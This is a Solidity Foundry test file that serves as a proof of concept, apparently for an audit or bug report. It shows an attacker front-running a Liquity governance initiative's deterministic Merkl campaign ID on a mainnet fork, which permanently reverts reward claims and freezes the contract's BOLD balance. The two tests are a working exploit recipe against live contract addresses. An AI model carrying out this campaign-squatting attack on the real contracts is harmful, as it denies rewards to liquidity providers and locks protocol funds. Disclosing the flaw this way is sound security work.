import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

import {IGovernance} from "../src/interfaces/IGovernance.sol";
import {UniV4MerklRewards, IDistributionCreator} from "../src/UniV4MerklRewards.sol";
import {Governance} from "../src/Governance.sol";

contract UniV4MerklSquatPoC is Test {
    IERC20 private constant lqty = IERC20(0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D);
    IERC20 private constant boldToken = IERC20(0x6440f144b7e50D6a8439336510312d2F54beB01D);
    address private constant GOVERNANCE_WHALE = 0xF30da4E4e7e20Dbf5fBE9adCD8699075D62C60A4;
    address private constant LQTY_WHALE = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

    Governance private constant governance = Governance(0x807DEf5E7d057DF05C796F4bc75C3Fe82Bd6EeE1);
    IDistributionCreator constant merkl = IDistributionCreator(0x8BB4C975Ff3c250e0ceEA271728547f3802B36Fd);

    bytes32 constant UNIV4_POOL_ID = 0x27eb93f973ec12bdc20f8a0959df46dfef29250bbb25c97e1ab6c96d2ad97f8e; // 0.01% fee
    uint32 private constant WEIGHT_FEES = 1500;
    uint32 private constant WEIGHT_TOKEN_0 = 4500;
    uint32 private constant WEIGHT_TOKEN_1 = 4000;
    uint256 private constant CAMPAIGN_BOLD_AMOUNT_THRESHOLD = 168e18 + 1; // > 1 BOLD/h

    uint256 private EPOCH_START;
    uint256 private EPOCH_DURATION;

    UniV4MerklRewards private initiative;
    address private attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 22737591);

        EPOCH_START = governance.EPOCH_START();
        EPOCH_DURATION = governance.EPOCH_DURATION();

        initiative = new UniV4MerklRewards(
            address(governance),
            address(boldToken),
            CAMPAIGN_BOLD_AMOUNT_THRESHOLD,
            UNIV4_POOL_ID,
            WEIGHT_FEES,
            WEIGHT_TOKEN_0,
            WEIGHT_TOKEN_1
        );

        // Register initiative (pays the registration fee)
        uint256 fee = governance.REGISTRATION_FEE();
        vm.startPrank(GOVERNANCE_WHALE);
        deal(address(boldToken), GOVERNANCE_WHALE, fee);
        boldToken.approve(address(governance), fee);
        governance.registerInitiative(address(initiative));
        vm.stopPrank();

        vm.warp(block.timestamp + EPOCH_DURATION);
    }

    // Give the initiative real claimable BOLD by voting for it (mirrors repo's testClaimCreatesCampaign)
    function _voteAndAccrue() internal returns (uint256 claimableAmount) {
        vm.startPrank(LQTY_WHALE);
        uint256 lqtyAmount = lqty.balanceOf(LQTY_WHALE);
        address userProxy = governance.deployUserProxy();
        lqty.approve(address(userProxy), lqtyAmount);
        governance.depositLQTY(lqtyAmount);

        address[] memory none;
        address[] memory inits = new address[](1);
        inits[0] = address(initiative);
        int256[] memory votes = new int256[](1);
        votes[0] = int256(lqtyAmount);
        int256[] memory vetos = new int256[](1);
        governance.allocateLQTY(none, inits, votes, vetos);
        vm.stopPrank();

        vm.warp(block.timestamp + 30 days); // accrue voting power
        (,, claimableAmount) = governance.getInitiativeState(address(initiative));
    }

    // Attacker pre-creates the identical campaign under creator = the initiative, funding minimal BOLD.
    function _squat(uint256 fundAmount) internal returns (bytes32 squattedId) {
        uint256 epochEnd = EPOCH_START + (governance.epoch() - 1) * EPOCH_DURATION;
        IDistributionCreator.CampaignParameters memory p = IDistributionCreator.CampaignParameters({
            campaignId: bytes32(0),
            creator: address(initiative), // <-- creator is used as-is by Merkl (not msg.sender)
            rewardToken: address(boldToken),
            amount: fundAmount, // amount is NOT part of campaignId; attacker funds minimal from own wallet
            campaignType: initiative.CAMPAIGN_TYPE(),
            startTimestamp: uint32(epochEnd),
            duration: uint32(EPOCH_DURATION),
            campaignData: initiative.getCampaignData()
        });
        squattedId = merkl.campaignId(p);

        vm.startPrank(attacker);
        deal(address(boldToken), attacker, fundAmount);
        boldToken.approve(address(merkl), fundAmount);
        merkl.acceptConditions(); // permissionless
        merkl.createCampaign(p); // funded from attacker (msg.sender), since initiative has no predeposit
        vm.stopPrank();
    }

    // ============================================================================
    // TEST 1 — permanent per-epoch DoS: attacker squats -> claimForInitiative() reverts
    // ============================================================================
    function testAttackerSquatsCampaignId_DoS() external {
        uint256 claimable = _voteAndAccrue();
        assertGt(claimable, CAMPAIGN_BOLD_AMOUNT_THRESHOLD, "need claimable > threshold so a campaign would be created");

        // Attacker front-runs with a minimal-but-valid amount (>= Merkl min; threshold is a safe over-estimate).
        bytes32 squattedId = _squat(CAMPAIGN_BOLD_AMOUNT_THRESHOLD);
        assertGt(merkl.campaignLookup(squattedId), 0, "attacker campaign should exist under the initiative's id");

        // The initiative's ONLY path now reverts: createCampaign -> CampaignAlreadyExists.
        vm.expectRevert(IDistributionCreator.CampaignAlreadyExists.selector);
        initiative.claimForInitiative();

        // Governance claim rolled back: initiative still has claimable rewards for this epoch (nothing forwarded).
        (,, uint256 stillClaimable) = governance.getInitiativeState(address(initiative));
        assertGt(stillClaimable, 0, "yield never forwarded to Merkl; DoS confirmed");
        console2.log("DoS confirmed: claimForInitiative reverts; still-claimable =", stillClaimable);
    }

    // ============================================================================
    // TEST 2 — freeze of a standing balance: BOLD in the contract can never leave (no recover fn)
    // ============================================================================
    function testStandingBalanceFrozen() external {
        // Standing balance reaches the contract (dust accrual over epochs, or a direct transfer — shown here directly).
        deal(address(boldToken), address(initiative), CAMPAIGN_BOLD_AMOUNT_THRESHOLD + 1);
        assertEq(boldToken.balanceOf(address(initiative)), CAMPAIGN_BOLD_AMOUNT_THRESHOLD + 1);

        // Attacker squats this epoch's id.
        _squat(CAMPAIGN_BOLD_AMOUNT_THRESHOLD);

        // Any attempt to flush the standing balance reverts; there is NO recover/withdraw function.
        vm.expectRevert(IDistributionCreator.CampaignAlreadyExists.selector);
        initiative.claimForInitiative();

        // Balance is stuck; the attacker can pre-schedule future epochs (deterministic startTimestamp)
        // to keep it frozen indefinitely, and the contract exposes no path to release it.
        assertEq(
            boldToken.balanceOf(address(initiative)),
            CAMPAIGN_BOLD_AMOUNT_THRESHOLD + 1,
            "standing BOLD frozen in the initiative (no recover fn)"
        );
        console2.log("Freeze confirmed: standing BOLD stuck =", boldToken.balanceOf(address(initiative)));
    }
}
